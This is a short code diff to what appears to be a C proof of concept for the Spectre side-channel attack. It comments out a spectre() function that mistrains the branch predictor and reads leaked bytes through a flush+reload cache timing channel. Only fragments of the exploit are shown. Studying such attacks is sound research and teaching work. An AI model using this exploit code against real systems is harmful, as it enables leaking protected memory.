@@ -79,7 +79,7 @@ void reloadSideChannel(int thresh){
   }
 }
 
-void spectre(size_t offset){
+/*void spectre(size_t offset){
   int i;
   u_int8_t s;
   //Mistraining the branch predictor using valid values for x
@@ -96,7 +96,7 @@ void spectre(size_t offset){
   array[s*4096 + DELTA] += 88; 
 
   reloadSideChannel(thresh);
-}
+}*/
 
 int main(int argc, const char**argv){
   thresh = atoi(argv[1]);
